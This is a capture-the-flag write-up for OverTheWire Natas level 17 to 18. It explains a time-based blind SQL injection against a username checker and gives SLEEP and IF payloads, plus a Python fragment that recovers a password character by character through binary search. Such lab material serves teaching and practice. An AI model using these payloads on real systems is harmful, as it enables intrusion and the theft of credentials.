# Natas — Level 17 → 18

**Category:** OverTheWire / Natas  
**Difficulty:** Hard  
**Date:** 2026-08-24  
**Level page:** [natas17.html](https://overthewire.org/wargames/natas/natas17.html)

## Goal

The same username-existence checker as level 15:

![natas17 page with a Username field and "Check existence" button](images/natas-17-18-page.png)

## Solution

The source looked identical to level 15 at first, except every response message was commented out:

    if($res) {
        if(mysqli_num_rows($res) > 0) {
            //echo "This user exists.<br>";
        } else {
            //echo "This user doesn't exist.<br>";
        }
    } else {
        //echo "Error in query.<br>";
    }

![Source showing the same query, but with all the echo statements commented out](images/natas-17-18-source.png)

No text ever comes back regardless of whether the condition is true or false — the boolean oracle from level 15 is gone. The only thing left that could leak information is timing. Tested with an unconditional delay first:

    natas18" AND SLEEP(10)#

![Username field with an unconditional SLEEP(10) payload](images/natas-17-18-sleep-test.png)

Then a conditional delay to confirm the response time actually depends on the condition:

    natas18" AND IF(1=1,SLEEP(10),0)#     → ~10s delay (true)
    natas18" AND IF(1=20,SLEEP(10),0)#    → no delay (false)

![Username field with the IF(1=1, SLEEP(10), 0) conditional payload](images/natas-17-18-if-test.png)

The page itself never showed anything either way — just the empty output box and the "View sourcecode" link, confirming this is purely time-based blind:

![Blank output regardless of the injected condition](images/natas-17-18-blank-output.png)

With a working true/false timing oracle, wrote a script to recover the password with a binary search per character instead of trying every character linearly — much fewer requests per position:

    payload = (
        f'natas18" AND '
        f'IF(ASCII(SUBSTRING(password,{pos},1))>{mid},'
        f'SLEEP(2),0)#'
    )

    start = time.time()
    s.post(URL, data={"username": payload}, timeout=5)
    elapsed = time.time() - start

    if elapsed > 1.5:
        low = mid + 1
    else:
        high = mid

For each of the 32 positions, this binary-searches the ASCII value of that character between 32 and 126 — a slow response (>1.5s) means the real character's ASCII value is higher than the midpoint, a fast one means it's lower or equal, narrowing the range until the exact character is found.

![solve.py doing a binary search per character using response timing as the oracle](images/natas-17-18-solve-script.png)

Ran it and watched each position resolve in turn:

    [+] 1: f
    [+] 2: fD
    [+] 3: fDG
    [+] 4: fDGn
    [+] 5: fDGn5
    [+] 6: fDGn5B
    [+] 7: fDGn5B6
    [+] 8: fDGn5B6G
    ...

![Terminal running solve.py, password resolving one character at a time](images/natas-17-18-solve-run.png)

All 32 positions eventually resolved to the full password:

![Terminal output showing the completed password](images/natas-17-18-result.png)

## Result

    Password for natas18: [REDACTED]

## Key Takeaway

Removing every visible difference between a true and false query doesn't remove the injection — it just forces the oracle into a different channel. `IF(condition, SLEEP(n), 0)` turns response latency itself into a boolean signal, and combining that with `ASCII(SUBSTRING(...))` and a binary search per character keeps the number of requests manageable (about 7 per character instead of up to 94) even with no output to read at all.
